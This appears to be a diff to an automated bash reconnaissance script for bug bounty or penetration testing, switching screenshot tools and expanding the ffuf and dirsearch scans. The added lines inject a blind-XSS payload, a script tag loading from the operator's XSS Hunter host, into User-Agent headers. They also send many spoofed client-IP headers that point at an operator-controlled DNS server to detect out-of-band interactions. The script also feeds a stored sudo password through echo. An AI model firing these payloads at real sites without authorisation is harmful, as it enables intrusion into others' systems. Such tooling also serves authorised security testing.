@@ -2,11 +2,12 @@
 
 passwordx=$(cat ~/tools/.creds | grep password | awk {'print $3'})
 dns_server=$(cat ~/tools/.creds | grep 'dns_server' | awk {'print $3'})
+xss_hunter=$(cat ~/tools/.creds | grep 'xss_hunter' | awk {'print $3'})
 
 [ ! -f ~/recon ] && mkdir ~/recon
 [ ! -f ~/recon/$1 ] && mkdir ~/recon/$1
 [ ! -f ~/recon/$1/webanalyze ] && mkdir ~/recon/$1/webanalyze
-[ ! -f ~/recon/$1/eyewitness ] && mkdir ~/recon/$1/eyewitness
+[ ! -f ~/recon/$1/aquatone ] && mkdir ~/recon/$1/aquatone
 [ ! -f ~/recon/$1/shodan ] && mkdir ~/recon/$1/shodan
 [ ! -f ~/recon/$1/dirsearch ] && mkdir ~/recon/$1/dirsearch
 [ ! -f ~/recon/$1/default-credential ] && mkdir ~/recon/$1/default-credential
@@ -304,8 +305,8 @@ if [ ! -z $(cat ~/tools/.tokens) ] && [ -e ~/tools/.tokens ]; then
 		python3 ~/tools/github-endpoints.py -d $url -s -r -t $(cat ~/tools/.tokens) > ~/recon/$1/github-endpoints/$url.txt
 		sleep 5
 	done
-	message "Done%20collecting%20endpoint%20in%20$1"
-	echo "[+] Done collecting endpoint"
+	message "Done%20collecting%20github%20endpoint%20in%20$1"
+	echo "[+] Done collecting github endpoint"
 else
 	message "Skipping%20github-endpoint%20script%20in%20$1"
 	echo "[!] Skipping ..."
@@ -342,13 +343,13 @@ else
 fi
 sleep 5	
 
-echo "[+] EYEWITNESS SCREENSHOT [+]"
-if [ ! -z $(which eyewitness) ]; then
-	echo $passwordx | sudo -S eyewitness -f ~/recon/$1/$1-httprobe.txt --web --timeout 10 --no-dns --no-prompt --cycle all -d ~/recon/$1/eyewitness
-	message "Done%20Eyewitness%20for%20Screenshot%20for%20$1"
-	echo "[+] Done eyewitness for screenshot of Alive assets"
+echo "[+] AQUATONE SCREENSHOT [+]"
+if [ ! -z $(which aquatone) ]; then
+	cat ~/recon/$1/$1-httprobe.txt | aquatone -out ~/recon/$1/aquatone
+	message "Done%20Aquatone%20for%20Screenshot%20for%20$1"
+	echo "[+] Done aquatone for screenshot of Alive assets"
 else
-	message "[-]%20Skipping%20Eyewitness%20Screenshot%20for%20$1"
+	message "[-]%20Skipping%20Aquatone%20Screenshot%20for%20$1"
 	echo "[!] Skipping ..."
 fi
 sleep 5
@@ -404,7 +405,7 @@ if [ ! -z $(which ffuf) ]; then
 	[ ! -f ~/tools/virtual-host-scanning.txt ] && wget "https://raw.githubusercontent.com/codingo/VHostScan/master/VHostScan/wordlists/virtual-host-scanning.txt" -O ~/tools/virtual-host-scanning.txt
 	cat ~/recon/$1/$1-open-ports.txt ~/recon/$1/$1-final.txt ~/recon/$1/$1-dnsgen.tmp ~/recon/$1/$1-final.tmp ~/recon/$1/$1-diff.txt ~/tools/virtual-host-scanning.txt | sed "s/\%s/$1/g" | sort -u >> ~/recon/$1/$1-temp-vhost-wordlist.txt
 	path=$(pwd)
-	ffuf -c -w "$path/recon/$1/$1-temp-vhost-wordlist.txt:HOSTS" -w "$path/recon/$1/$1-alive.txt:TARGETS" -u http://TARGETS -k -r -H "Host: HOSTS" -H "X-Forwarded-For: TARGETS.override.$dns_server" -mc all -fc 500-599 -of html -o ~/recon/$1/virtual-hosts/$1.html
+	ffuf -c -w "$path/recon/$1/$1-temp-vhost-wordlist.txt:HOSTS" -w "$path/recon/$1/$1-alive.txt:TARGETS" -u http://TARGETS -k -r -H "Host: HOSTS" -H "X-Forwarded-For: TARGETS.xforwarded.$dns_server" -H "X-Real-IP: TARGETS.xrealip.$dns_server" -H "X-Originating-IP: TARGETS.xoriginatingip.$dns_server" -H "Client-IP: TARGETS.clientip.$dns_server" -H "CF-Connecting_IP: TARGETS.cfconnectingip.$dns_server" -H "Forwarded: for=TARGETS.for-forwarded.$dns_server;by=TARGETS.by-forwarded.$dns_server;host=TARGETS.host-forwarded.$dns_server" -H "X-Client-IP: TARGETS.xclientip.$dns_server" -H "True-Client-IP: TARGETS.trueclientip.$dns_server" -H "X-Forwarded-Host: TARGETS.xforwardedhost.$dns_server" -H "User-Agent: '\">blahblah<script src='$xss_hunter'></script>testing" -mc all -fc 500-599 -of html -o ~/recon/$1/virtual-hosts/$1.html
 	message "Virtual%20Host%20done%20for%20$1"
 	rm ~/recon/$1/$1-dnsgen.tmp ~/recon/$1/$1-final.tmp ~/recon/$1/$1-diff.txt
 	echo "[+] Done ffuf for scanning virtual hosts"
@@ -416,7 +417,7 @@ rm ~/recon/$1/$1-temp-vhost-wordlist.txt
 sleep 5
 
 echo "[+] DirSearch Scanning for Sensitive Files [+]"
-cat ~/recon/$1/$1-httprobe.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' | sort -u | xargs -P10 -I % sh -c "python3 ~/dirsearch/dirsearch.py -u % -e php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -x 400,403,401,500,406,503,502 -t 100 --random-agents -b --plain-text-report ~/recon/$1/dirsearch/%-dirsearch.txt"
+cat ~/recon/$1/$1-httprobe.txt | sed 's/http:\/\///g' | sed 's/https:\/\///g' | sort -u | xargs -P10 -I % sh -c "python3 ~/dirsearch/dirsearch.py -u % -e php,bak,txt,asp,aspx,jsp,html,zip,jar,sql,json,old,gz,shtml,log,swp,yaml,yml,config,save,rsa,ppk -x 400,404,301,401,500,406,503,502 -t 100 -H \"User-Agent: '\">blahblah<script src='$xss_hunter'></script>testing\" -b --plain-text-report ~/recon/$1/dirsearch/%-dirsearch.txt"
 echo "[+] Done dirsearch for file and directory scanning"
 sleep 5
 
